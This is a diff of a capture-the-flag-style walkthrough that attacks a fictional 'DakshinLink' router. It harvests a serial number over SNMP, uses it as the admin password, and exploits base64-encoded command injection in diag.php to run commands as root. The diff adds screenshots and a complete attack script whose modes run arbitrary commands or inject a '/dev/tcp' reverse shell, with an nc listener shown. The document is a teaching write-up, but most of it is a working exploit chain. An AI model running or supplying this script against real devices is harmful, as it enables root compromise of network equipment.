@@ -145,6 +145,8 @@ snmpwalk -v1 -c public -t 3 -r 1 \
   "udp:${TARGET_IP}:${SNMP_PORT}" \
   .1.3.6.1.2.1.47.1.1.1.1.11
 ```
+<img width="706" height="276" alt="image" src="https://github.com/user-attachments/assets/4d64af74-14a3-40c9-b74f-6d2364147a58" />
+
 The queried OID (`.1.3.6.1.2.1.47.1.1.1.1.11`) corresponds to `entPhysicalSerialNum` in the standard Entity MIB. Security tools commonly query this OID to inventory network hardware and identify devices exposing insecure SNMP configurations.
 
 Command breakdown:
@@ -174,13 +176,6 @@ Command breakdown:
   Specifies the destination target using UDP, typically on port 161.
 
 - `.1.3.6.1.2.1.47.1.1.1.1.11`
-  
-  The Object Identifier (OID) corresponding to `entPhysicalSerialNum`. It returns the serial numbers of physical hardware components on the device, including:
-
-  - Chassis
-  - Line cards
-  - Power supplies
-  - Other physical modules recognised by the Entity MIB
 
 This information is commonly used during asset inventory, hardware identification, and security assessments to detect devices exposing sensitive hardware information through insecure SNMP configurations.
 
@@ -202,6 +197,7 @@ export SERIAL="$(
 )"
 printf 'SERIAL=%s\n' "$SERIAL"
 ```
+<img width="868" height="312" alt="image" src="https://github.com/user-attachments/assets/ff329ae6-6a2e-4a1f-8051-dd893aa09ca6" />
 
 Log in through a browser with:
 
@@ -209,6 +205,8 @@ Log in through a browser with:
 Username: admin
 Password: <live serial returned by SNMP>
 ```
+<img width="1378" height="653" alt="image" src="https://github.com/user-attachments/assets/655516d3-b888-4972-9564-8c9385eb187a" />
+<img width="1326" height="870" alt="image" src="https://github.com/user-attachments/assets/837a707c-8064-4733-a093-5a817511a0b7" />
 
 For a command-line session:
 
@@ -221,8 +219,11 @@ curl -sS -L -c "$COOKIE" -b "$COOKIE" \
   -o dashboard.html
 grep -F "DakshinLink routing operations" dashboard.html
 ```
+<img width="636" height="291" alt="image" src="https://github.com/user-attachments/assets/e7d67e0a-3442-4ace-8997-764c92dd4334" />
 
 ## 5. Phase 3 - Diagnostics command injection
+
+<img width="1358" height="722" alt="image" src="https://github.com/user-attachments/assets/0affecc9-e168-460b-af21-b0e37bb5cb00" />
 
 Open Diagnostics through Burp Suite and intercept the `POST /diag.php`
 request. The hidden `check` value is base64 and decodes to `frr`:
@@ -230,12 +231,15 @@ request. The hidden `check` value is base64 and decodes to `frr`:
 ```bash
 printf '%s' '<captured-check-value>' | base64 -d
 ```
+<img width="1469" height="808" alt="image" src="https://github.com/user-attachments/assets/41c62439-8e2e-4ef9-b6a9-71564f502581" />
+<img width="510" height="183" alt="image" src="https://github.com/user-attachments/assets/e10955a0-957a-44bc-af0e-b3da70bbbc4e" />
 
 The application builds a remote command in the form:
 
 ```text
 ps aux | grep <decoded-check>
 ```
+<img width="1144" height="344" alt="image" src="https://github.com/user-attachments/assets/c59e2041-d92e-4ff6-8dc6-13b7ad42670b" />
 
 Terminate the expected command and append `id`:
 
@@ -245,6 +249,9 @@ curl -sS -b "$COOKIE" \
   --data-urlencode "check=$INJECTION_B64" \
   "http://${TARGET_IP}:${HTTP_PORT}/diag.php"
 ```
+<img width="1470" height="593" alt="image" src="https://github.com/user-attachments/assets/48bfcc31-8d34-42e4-9ff5-505b55a48703" />
+<img width="1470" height="769" alt="image" src="https://github.com/user-attachments/assets/ff676f7e-9619-48f8-826b-1ba11a15dde9" />
+<img width="1470" height="829" alt="image" src="https://github.com/user-attachments/assets/39a2c4e3-dbbf-4a8e-b22f-65a20cdf98ed" />
 
 The returned output proves command execution as `uid=0(root)` on the
 DakshinLink router, not inside the web portal.
@@ -255,6 +262,96 @@ request:
 ```bash
 ./Red-Team-Attack-Script.sh "$TARGET_IP" "$HTTP_PORT" "$SNMP_PORT" probe
 ```
+<img width="870" height="333" alt="image" src="https://github.com/user-attachments/assets/21f5e1e6-e08b-4270-95d0-abfb08270251" />
+
+```bash
+#!/usr/bin/env bash
+# External Carrier-style assessment client. Run on Kali, never on the challenge VM.
+set -euo pipefail
+
+usage(){
+  cat <<'EOF'
+Usage:
+  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT probe
+  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT command 'COMMAND'
+  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT reverse LHOST LPORT
+
+Modes:
+  probe    Prove authenticated diagnostic command injection with id/hostname.
+  command  Execute one supplied command through the vulnerable diagnostic transport.
+  reverse  Trigger a reverse shell. Start a listener on LHOST:LPORT first.
+
+Use LHOST=auto to derive the Kali source address selected for TARGET_IP.
+EOF
+}
+[[ $# -ge 4 ]] || { usage; exit 2; }
+TARGET_IP="$1"; HTTP_PORT="$2"; SNMP_PORT="$3"; MODE="$4"; shift 4
+[[ "$HTTP_PORT" =~ ^[0-9]+$ && "$SNMP_PORT" =~ ^[0-9]+$ ]] || { echo "Ports must be numeric" >&2; exit 2; }
+for tool in snmpwalk curl base64 ip; do command -v "$tool" >/dev/null || { echo "Missing tool: $tool" >&2; exit 3; }; done
+
+COOKIE="$(mktemp)"
+trap 'rm -f "$COOKIE"' EXIT
+OID=".1.3.6.1.2.1.47.1.1.1.1.11"
+SERIAL="$(
+  snmpwalk -v1 -c public -t 3 -r 1 \
+    "udp:${TARGET_IP}:${SNMP_PORT}" "$OID" 2>/dev/null \
+    | sed -n 's/.*SN#\([^"]*\).*/\1/p' | head -n 1
+)"
+[[ -n "$SERIAL" ]] || { echo "Serial number was not returned by SNMP" >&2; exit 4; }
+printf '[+] SNMP serial: %s\n' "$SERIAL"
+
+curl -fsS -L --max-time 10 \
+  -c "$COOKIE" -b "$COOKIE" \
+  --data-urlencode "username=admin" \
+  --data-urlencode "password=$SERIAL" \
+  "http://${TARGET_IP}:${HTTP_PORT}/index.php" \
+  | grep -q "DakshinLink routing operations" \
+  || { echo "Portal authentication failed" >&2; exit 5; }
+echo "[+] Portal authentication succeeded"
+
+case "$MODE" in
+  probe)
+    REMOTE_COMMAND=";id;hostname;vtysh -c 'show bgp ipv4 unicast summary'"
+    ;;
+  command)
+    [[ $# -eq 1 ]] || { usage; exit 2; }
+    REMOTE_COMMAND=";$1"
+    ;;
+  reverse)
+    [[ $# -eq 2 ]] || { usage; exit 2; }
+    LHOST="$1"; LPORT="$2"
+    [[ "$LPORT" =~ ^[0-9]+$ ]] || { echo "LPORT must be numeric" >&2; exit 2; }
+    if [[ "$LHOST" == auto ]]; then
+      LHOST="$(ip -4 route get "$TARGET_IP" | awk '{for(i=1;i<=NF;i++)if($i=="src"){print $(i+1);exit}}')"
+    fi
+    [[ -n "$LHOST" ]] || { echo "Unable to determine LHOST" >&2; exit 6; }
+    printf '[*] Listener must already be running: nc -lvnp %s\n' "$LPORT"
+    SHELL_CODE="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
+    SHELL_B64="$(printf '%s' "$SHELL_CODE" | base64 -w 0)"
+    REMOTE_COMMAND=";echo ${SHELL_B64}|base64 -d|bash"
+    ;;
+  *)
+    usage
+    exit 2
+    ;;
+esac
+
+CHECK_B64="$(printf '%s' "$REMOTE_COMMAND" | base64 -w 0)"
+if [[ "$MODE" == reverse ]]; then
+  curl -sS --max-time 7 -b "$COOKIE" \
+    --data-urlencode "check=$CHECK_B64" \
+    "http://${TARGET_IP}:${HTTP_PORT}/diag.php" >/dev/null || true
+  echo "[+] Reverse-shell diagnostic request sent"
+else
+  curl -fsS --max-time 20 -b "$COOKIE" \
+    --data-urlencode "check=$CHECK_B64" \
+    "http://${TARGET_IP}:${HTTP_PORT}/diag.php" \
+    | sed -n '/<pre>/,/<\/pre>/p' \
+    | sed -e 's/<[^>]*>//g' -e 's/&gt;/>/g' -e 's/&lt;/</g' -e 's/&amp;/\&/g'
+fi
+```
+<img width="1144" height="399" alt="image" src="https://github.com/user-attachments/assets/25d66e7f-2496-42ca-a3a9-a435b2434b81" />
+<img width="893" height="299" alt="image" src="https://github.com/user-attachments/assets/2b305c08-ed1d-4389-9e8a-b28386adcb2e" />
 
 ## 6. Phase 4 - Obtain an interactive router shell
 
@@ -276,7 +373,6 @@ PY
 )"
 printf 'LHOST=%s LPORT=%s\n' "$LHOST" "$LPORT"
 ```
-
 Start the listener first:
 
 ```bash
@@ -290,6 +386,7 @@ In another terminal:
   "$TARGET_IP" "$HTTP_PORT" "$SNMP_PORT" \
   reverse "$LHOST" "$LPORT"
 ```
+<img width="799" height="211" alt="image" src="https://github.com/user-attachments/assets/f97f7f57-b8cf-46ee-aa04-c05ee12b1d2b" />
 
 Confirm the shell:
 
@@ -298,6 +395,7 @@ id
 hostname
 ip -br address
 ```
+<img width="799" height="365" alt="image" src="https://github.com/user-attachments/assets/847cb492-877a-4b3a-ae34-168f47ea3224" />
 
 ## 7. Phase 5 - Understand the live BGP topology
 
@@ -307,15 +405,23 @@ password. Record the subnet exactly:
 ```bash
 export FTP_SUBNET="<subnet-from-ticket-6>"
 ```
+<img width="710" height="182" alt="image" src="https://github.com/user-attachments/assets/f13db075-e79a-4a39-9c49-d80414cb255e" />
 
 On the router shell:
 
 ```bash
-vtysh -c "show running-config"
-vtysh -c "show bgp ipv4 unicast summary"
-vtysh -c "show bgp ipv4 unicast"
+vtysh 
+show running-config
+```
+<img width="1333" height="874" alt="image" src="https://github.com/user-attachments/assets/34d2a701-14d8-4d9a-89da-9fd66cd5b56e" />
+
+```bash
+show bgp ipv4 unicast summary
+show bgp ipv4 unicast
 ip -4 route
 ```
+<img width="1281" height="635" alt="image" src="https://github.com/user-attachments/assets/8415bc7c-c812-44c3-a8e5-7ace04aae436" />
+
 
 Map each neighbor ASN to the organisation shown in
 `diagram_for_tac.png`. Record:
